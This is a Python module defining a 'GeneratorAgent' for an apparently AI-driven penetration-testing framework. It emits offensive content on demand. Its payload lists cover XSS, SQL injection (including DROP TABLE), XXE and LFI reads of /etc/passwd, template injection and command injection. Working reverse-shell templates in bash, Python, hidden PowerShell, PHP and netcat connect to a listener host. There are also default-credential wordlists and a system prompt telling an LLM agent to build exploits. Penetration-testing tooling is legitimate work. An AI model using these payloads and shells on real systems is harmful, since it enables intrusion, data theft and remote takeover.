"""
Generator Agent — Payload, Wordlist, and PoC Content Generation

Purpose-built content generation: payloads, wordlists, PoC code, exploit
templates, and reverse shell commands for penetration testing engagements.
"""

from __future__ import annotations

import logging
from enum import Enum
from typing import Any, Dict, List, Optional

from app.agent.agents import BaseAgent, MultiAgentState
from app.agent.state.agent_state import Phase
from app.agent.tools.tool_registry import ToolRegistry

logger = logging.getLogger(__name__)


class GenerationType(str, Enum):
    """Types of content the GeneratorAgent can produce."""

    PAYLOAD = "payload"
    WORDLIST = "wordlist"
    POC_CODE = "poc_code"
    EXPLOIT_TEMPLATE = "exploit_template"
    REVERSE_SHELL = "reverse_shell"
    CUSTOM = "custom"


class GeneratorAgent(BaseAgent):
    """
    Sub-agent specialised in generating offensive security content.

    Produces payloads, wordlists, proof-of-concept code, exploit templates,
    and reverse shell commands tailored to the target environment.
    """

    AGENT_NAME = "generator"
    PREFERRED_TOOLS: List[str] = ["web_search", "searchsploit", "query_graph"]

    def __init__(
        self,
        registry: ToolRegistry,
        llm: Any = None,
        config: Optional[Dict[str, Any]] = None,
    ) -> None:
        super().__init__(registry, llm, config)

    # ------------------------------------------------------------------
    # BaseAgent interface
    # ------------------------------------------------------------------

    def get_phase(self) -> Phase:
        return Phase.EXPLOITATION

    def _build_system_prompt(self) -> str:
        tool_names = ", ".join(self.get_tool_names()) or "none"
        return (
            "You are the Generator Agent, an expert in creating offensive "
            "security content for authorised penetration testing.\n\n"
            "Your responsibilities:\n"
            "  1. Generate context-aware payloads for various vulnerability types.\n"
            "  2. Build targeted wordlists for fuzzing and brute-force attacks.\n"
            "  3. Create proof-of-concept code demonstrating vulnerabilities.\n"
            "  4. Produce exploit templates based on known CVEs.\n"
            "  5. Generate reverse shell commands for multiple platforms.\n\n"
            f"Available tools: {tool_names}.\n\n"
            "All content is for authorised testing only.  Return structured "
            "output with generated content, type, and usage instructions."
        )

    async def run(
        self, state: MultiAgentState, task: str
    ) -> Dict[str, Any]:
        """
        Generate content based on the task description.

        Args:
            state: Shared multi-agent state.
            task:  Description of what to generate.

        Returns:
            ``{"agent": "generator", "generation_type": str, "content": Any,
               "usage": str}``
        """
        target_info = state.get("target_info") or {}
        logger.info("GeneratorAgent task: %s", task[:80])

        generation_type = self._infer_generation_type(task)

        if generation_type == GenerationType.PAYLOAD:
            content = await self._generate_payload_from_task(task, target_info)
        elif generation_type == GenerationType.WORDLIST:
            content = self.generate_wordlist("general", 100, [])
        elif generation_type == GenerationType.POC_CODE:
            content = self.generate_poc("", "generic", target_info)
        elif generation_type == GenerationType.REVERSE_SHELL:
            lhost = target_info.get("lhost", "10.10.10.10")
            lport = target_info.get("lport", 4444)
            content = self.generate_reverse_shell("linux", str(lhost), int(lport), "bash")
        else:
            content = {"generated": task, "note": "custom generation"}

        return {
            "agent": self.AGENT_NAME,
            "generation_type": generation_type.value,
            "content": content,
            "usage": f"Generated for task: {task[:100]}",
        }

    # ------------------------------------------------------------------
    # Domain-specific methods
    # ------------------------------------------------------------------

    def generate_payload(
        self,
        payload_type: str,
        context: Dict[str, Any],
    ) -> Dict[str, Any]:
        """
        Generate an attack payload for the specified vulnerability type.

        Args:
            payload_type: Type of payload (e.g. "xss", "sqli", "xxe").
            context:      Target context including URL, parameter names, etc.

        Returns:
            Dict with ``payload``, ``type``, ``encoding``, ``notes``.
        """
        payloads: Dict[str, List[str]] = {
            "xss": [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert(1)>",
                "'\"><script>alert(document.domain)</script>",
                "<svg onload=alert(1)>",
            ],
            "sqli": [
                "' OR '1'='1",
                "' OR 1=1--",
                "'; DROP TABLE users;--",
                "' UNION SELECT NULL,NULL,NULL--",
            ],
            "xxe": [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            ],
            "lfi": [
                "../../../../etc/passwd",
                "....//....//etc/passwd",
                "/etc/passwd%00",
            ],
            "ssti": [
                "{{7*7}}",
                "${7*7}",
                "#{7*7}",
                "<%= 7*7 %>",
            ],
            "cmd": [
                "; id",
                "| id",
                "$(id)",
                "`id`",
            ],
        }

        payload_list = payloads.get(payload_type.lower(), [f"<payload for {payload_type}>"])

        return {
            "payload": payload_list[0],
            "alternatives": payload_list[1:],
            "type": payload_type,
            "encoding": "raw",
            "context": context,
            "notes": f"Test payload for {payload_type}; adapt to target context.",
        }

    def generate_wordlist(
        self,
        category: str,
        size: int,
        custom_patterns: List[str],
    ) -> List[str]:
        """
        Generate a wordlist for the given category.

        Args:
            category:        Category of wordlist (e.g. "dirs", "users", "passwords").
            size:            Maximum number of entries to generate.
            custom_patterns: Additional patterns to include.

        Returns:
            List of wordlist strings.
        """
        base_lists: Dict[str, List[str]] = {
            "dirs": [
                "admin", "api", "backup", "config", "dashboard", "db",
                "debug", "dev", "files", "images", "include", "js",
                "login", "logout", "old", "panel", "phpinfo", ".git",
                "robots.txt", "sitemap.xml", "wp-admin", "wp-login.php",
            ],
            "users": [
                "admin", "administrator", "root", "user", "guest",
                "test", "demo", "operator", "support", "service",
            ],
            "passwords": [
                "password", "123456", "admin", "root", "test",
                "password123", "qwerty", "letmein", "changeme", "default",
            ],
            "general": [
                "admin", "login", "test", "backup", "config", "api",
                "user", "password", "secret", "token", "key", "debug",
            ],
        }

        wordlist = base_lists.get(category, base_lists["general"])
        wordlist = wordlist + custom_patterns
        return wordlist[:size]

    def generate_poc(
        self,
        cve_id: str,
        vulnerability_type: str,
        target_info: Dict[str, Any],
    ) -> str:
        """
        Generate a proof-of-concept exploit script.

        Args:
            cve_id:            CVE identifier (e.g. "CVE-2021-44228").
            vulnerability_type: Type of vulnerability.
            target_info:       Target details (URL, IP, service).

        Returns:
            Python PoC code as a string.
        """
        target = target_info.get("target", "TARGET")
        cve_ref = f"# CVE: {cve_id}\n" if cve_id else ""

        return (
            f"#!/usr/bin/env python3\n"
            f'"""\n'
            f"Proof of Concept — {vulnerability_type.upper()}\n"
            f"{cve_ref}"
            f"Target: {target}\n"
            f"Generated by UniVex GeneratorAgent\n"
            f'"""\n\n'
            f"import requests\n\n"
            f"TARGET = '{target}'\n\n"
            f"def exploit():\n"
            f"    # TODO: implement {vulnerability_type} exploit logic\n"
            f"    response = requests.get(TARGET)\n"
            f"    print(f'Status: {{response.status_code}}')\n"
            f"    print('PoC executed successfully')\n\n"
            f"if __name__ == '__main__':\n"
            f"    exploit()\n"
        )

    def generate_reverse_shell(
        self,
        os_type: str,
        lhost: str,
        lport: int,
        shell_type: str,
    ) -> str:
        """
        Generate a reverse shell command for the target OS.

        Args:
            os_type:    Target OS ("linux", "windows", "macos").
            lhost:      Listener host IP.
            lport:      Listener port.
            shell_type: Shell type ("bash", "python", "powershell", "php").

        Returns:
            Reverse shell command string.
        """
        templates: Dict[str, str] = {
            "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            "python": (
                f"python3 -c 'import socket,subprocess,os;"
                f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
                f"s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);"
                f"os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
                f"subprocess.call([\"/bin/sh\",\"-i\"])'"
            ),
            "powershell": (
                f"powershell -NoP -NonI -W Hidden -Exec Bypass "
                f"-Command New-Object System.Net.Sockets.TCPClient(\"{lhost}\",{lport});"
                f"$stream=$client.GetStream();"
                f"[byte[]]$bytes=0..65535|%{{0}};"
                f"while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){{"
                f"$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
                f"$sendback=(iex $data 2>&1|Out-String);"
                f"$sendback2=$sendback+'PS '+(pwd).Path+'> ';"
                f"$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);"
                f"$stream.Write($sendbyte,0,$sendbyte.Length);"
                f"$stream.Flush()}};$client.Close()"
            ),
            "php": (
                f'php -r \'$sock=fsockopen("{lhost}",{lport});'
                f"exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
            ),
            "nc": f"nc -e /bin/sh {lhost} {lport}",
        }

        return templates.get(shell_type.lower(), templates["bash"])

    # ------------------------------------------------------------------
    # Private helpers
    # ------------------------------------------------------------------

    def _infer_generation_type(self, task: str) -> GenerationType:
        """Infer the generation type from the task description."""
        task_lower = task.lower()
        if "wordlist" in task_lower or "fuzz" in task_lower:
            return GenerationType.WORDLIST
        if "reverse shell" in task_lower or "revshell" in task_lower:
            return GenerationType.REVERSE_SHELL
        if "poc" in task_lower or "proof of concept" in task_lower:
            return GenerationType.POC_CODE
        if "exploit template" in task_lower:
            return GenerationType.EXPLOIT_TEMPLATE
        if "payload" in task_lower:
            return GenerationType.PAYLOAD
        return GenerationType.CUSTOM

    async def _generate_payload_from_task(
        self, task: str, context: Dict[str, Any]
    ) -> Dict[str, Any]:
        """Extract payload type from task and generate."""
        vuln_keywords = ["xss", "sqli", "xxe", "lfi", "ssti", "cmd", "rce"]
        detected = next((k for k in vuln_keywords if k in task.lower()), "xss")
        return self.generate_payload(detected, context)


__all__ = ["GeneratorAgent", "GenerationType"]
